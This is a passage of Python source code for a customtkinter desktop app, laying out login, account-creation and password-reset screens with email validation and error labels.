email_alerts_login = customtkinter.CTkLabel(login_page, text="Email ID is not registered",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")

email_alerts_verified = customtkinter.CTkLabel(login_page, text="Email ID is not verified",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")

password_entry = customtkinter.CTkEntry(login_page, placeholder_text='Password', width=280, height=46, show="●")
password_entry.pack(pady=10, padx=20)

password_alerts_login = customtkinter.CTkLabel(login_page, text="Wrong Password",
                                         font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")

def login_caller(event):
    login(event=1, email=email_entry.get(), password=password_entry.get())

login_button_1 = customtkinter.CTkButton(login_page, text="Login", font=customtkinter.CTkFont(family="Roboto", size=20),corner_radius=50, height=46, width=280, cursor="hand2")
login_button_1.pack(pady=(15,10), padx=20)
login_button_1.bind("<Button-1>", login_caller)
password_entry.bind("<Return>", login_caller)

go_create_user_page = customtkinter.CTkLabel(login_page, text="Not Registered? ", font=customtkinter.CTkFont(family="Rem", size=15),text_color="#306896", cursor="hand2")
go_create_user_page.pack(pady=(20,10), padx=(80,0),side="left")
go_create_user_page.bind("<Button-1>", go_to_create_user_page)

go_create_user_page = customtkinter.CTkLabel(login_page, text="●", font=customtkinter.CTkFont(family="Rem", size=15),text_color="#306896", cursor="hand2")
go_create_user_page.pack(pady=(20,10),side="left")

forgot_password = customtkinter.CTkLabel(login_page, text="Forgot Password?", font=customtkinter.CTkFont(family="Rem", size=15),text_color="#911d1d", cursor="hand2")
forgot_password.pack(pady=(20,10), padx=5,side="left")
forgot_password.bind("<Button-1>", go_to_forget_password)

# ------------------------------------------------------------------------------------- Create User ------------------------------------------------------------------------------------------------



create_user_page = customtkinter.CTkFrame(root, width=400, height=480)
create_user_page.propagate(False)

back = customtkinter.CTkLabel(master=create_user_page, text="", image=PhotoImage(file=folder_path+r"\back.png"), cursor="hand2")
back.place(x=20, y=20)
back.bind("<Button-1>", go_to_main_page)

dashboard_label = customtkinter.CTkLabel(create_user_page, text="Create Account",font=customtkinter.CTkFont(family="Rem", size=25), cursor="hand2")
dashboard_label.pack(pady=(80,0), padx=20)

email_entry_create = customtkinter.CTkEntry(create_user_page, placeholder_text='Email Address', width=280, height=46)
email_entry_create.pack(pady=(70,10), padx=20)

email_alerts = customtkinter.CTkLabel(create_user_page, text="Email ID is invalid",
                                      font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")

password_entry_create = customtkinter.CTkEntry(create_user_page, placeholder_text='Password', show="●", width=280,height=46)
password_entry_create.pack(pady=10, padx=20)

password_alerts = customtkinter.CTkLabel(create_user_page, text="Your password is too short",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")

login_button_2 = customtkinter.CTkButton(create_user_page, text="Sign Up",font=customtkinter.CTkFont(family="Roboto", size=20), corner_radius=50,height=46, width=280, command=create_user)
login_button_2.pack(pady=10, padx=20)

go_login_page = customtkinter.CTkLabel(create_user_page, text="Already Registered?",font=customtkinter.CTkFont(family="Rem", size=15), text_color="#306896",cursor="hand2")
go_login_page.pack(pady=(40,10))
go_login_page.bind("<Button-1>", go_to_login_page)

# --------------------------------------------------------------------------------- Forgot Password UI ----------------------------------------------------------------------------------------
def get_mail_id(event):
    mail = mail_entry.get()
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    try:
        if re.match(pattern, mail):
            done_alert.place(x=62, y=268)
            send_reset_mail(mail=mail)
            return True
        else:
            done_alert.place_forget()
            forgot_password_alerts.configure(text="Invalid Email ID")
            forgot_password_alerts.place(x=62, y=268)
            return False
        
    except requests.exceptions.HTTPError as e:
        if "EMAIL_NOT_FOUND" in str(e):
            done_alert.place_forget()
            forgot_password_alerts.configure(text="Email Not Found")
            forgot_password_alerts.place(x=62, y=268)
            return

forgot_password_main_frame = customtkinter.CTkFrame(root, width=400, height=480)
forgot_password_main_frame.propagate(False)

back = customtkinter.CTkLabel(master=forgot_password_main_frame, text="", image=PhotoImage(file=folder_path+r"\back.png"), cursor="hand2")
back.place(x=20, y=20)
back.bind("<Button-1>", go_to_main_page)

customtkinter.CTkLabel(forgot_password_main_frame, text="Reset your password", font=customtkinter.CTkFont(family="Rem", size=25)).pack(pady=(90,80), padx=20)

forgot_password_alerts = customtkinter.CTkLabel(forgot_password_main_frame, text="Invalid Email ID",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")
done_alert = customtkinter.CTkLabel(forgot_password_main_frame, text="Email Has Been Sent",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#DCE4EE")

mail_entry = customtkinter.CTkEntry(forgot_password_main_frame, placeholder_text='Email ID', width=280, height=46)
mail_entry.pack(pady=20, padx=20)

check = customtkinter.CTkButton(forgot_password_main_frame, text="Send Mail", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280)
check.pack(pady=(20,30), padx=20)
check.bind('<Button-1>', get_mail_id)

forgot_master_password = customtkinter.CTkLabel(forgot_password_main_frame, text="Go Back", font=customtkinter.CTkFont(family="Rem", size=15),text_color="#306896", cursor="hand2")
forgot_master_password.pack(pady=(50,20))
forgot_master_password.bind("<Button-1>", go_to_login_page)


root.mainloop()